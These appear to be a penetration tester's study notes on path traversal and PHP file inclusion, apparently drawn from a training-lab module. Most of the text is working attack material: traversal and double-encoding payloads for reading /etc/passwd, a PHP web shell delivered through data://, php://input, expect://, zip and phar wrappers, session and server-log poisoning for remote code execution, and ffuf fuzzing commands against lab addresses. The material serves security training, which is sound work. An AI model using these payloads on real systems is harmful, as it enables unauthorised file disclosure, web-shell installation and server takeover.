# Path Traversal 
## Interview diff btw LFI , LFD

LFI -> Local File Inclusion -> read and excute the file ( file upload shell and excute it)
RFI -> Remote File Inclusion -> if paramter is allowed to access some external resources then i inject my server inside of it 
LFD -> local file disclosure -> ability to read senstive file like etc/passwd


../../../../../etc/passwd
/etc/passwd
....//....//....//....//etc/passwd

#double encode for /
..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd

# null byte terminates the path before .jpg 
../../../../etc/passwd%00.jpg



#### Checking PHP Configurations

/etc/php/X.Y/apache2/php.ini

read the config file 
```shell-session
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

#### Remote Code Execution

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```shell-session
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

#### PHP Wrappers
- With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.
```shell-session
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

##### INPUT
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```shell-session
php://input&cmd=id
```
## EXPECT
if  read the configuration and find it installed 
```shell-session
extension=expect
```

```shell-session
expect://id
```

### Zip Upload

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:

for example
`zip://./profile_images/shell.jpg#shell.php&cmd=id`
encode the #
`zip://./profile_images/shell.jpg%23shell.php&cmd=id`
## Phar Upload

Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a phar file called `shell.jpg`. Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
`phar://./profile_images/shell.jpg/shell.txt&cmd=id`
encode the /
`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

## PHP Session Poisoning

Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

![[Pasted image 20251228101558.png]]

As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:
`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`

![Shipping containers and cranes at a port with browser console displaying PHP session information.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_session_include.png)

Finally, we can include the session file and use the `&cmd=id` to execute a commands:
`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`

## Server Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

So, let's try including the Apache access log from `/var/log/apache2/access.log`, and see what we get:

![[Pasted image 20251228102025.png]]
As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.

As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell:

![[Pasted image 20251228102100.png]]

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`):
![[Pasted image 20251228102128.png]]
**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.



# Automate Scanning
## Fuzzing Parameters

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.61.249:43693/index.php?FUZZ=value' -fs 2309
```

## LFI wordlists
There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:

```shell-session
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

## Fuzzing Server Files

In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: `Server webroot path`, `server configurations file`, and `server logs`.

#### Server Webroot

We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.

```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

#### Server Logs/Configurations

As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).

To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:

```shell-session
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.
